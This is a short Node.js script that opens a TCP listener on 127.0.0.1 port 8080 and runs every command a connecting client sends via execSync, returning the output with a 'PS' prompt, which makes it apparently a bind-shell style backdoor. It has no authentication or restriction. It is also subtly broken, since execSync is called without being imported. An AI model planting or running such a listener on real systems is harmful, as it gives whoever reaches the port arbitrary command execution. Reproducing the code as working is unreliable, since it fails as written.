const net = require('net');

const IP = "127.0.0.1";
const PORT = 8080;

// Create the listener
const server = net.createServer((client) => {
    // Send a message to the client
    client.write("New Client Connected");

    // Receive commands from the client
    client.on('data', (data) => {
        let command = data.toString().trim();
        // Execute the command and send the output back to the client
        let output = execSync(command).toString();
        client.write("PS " + process.cwd() + "> " + output);
    });
});

server.listen(PORT, IP);
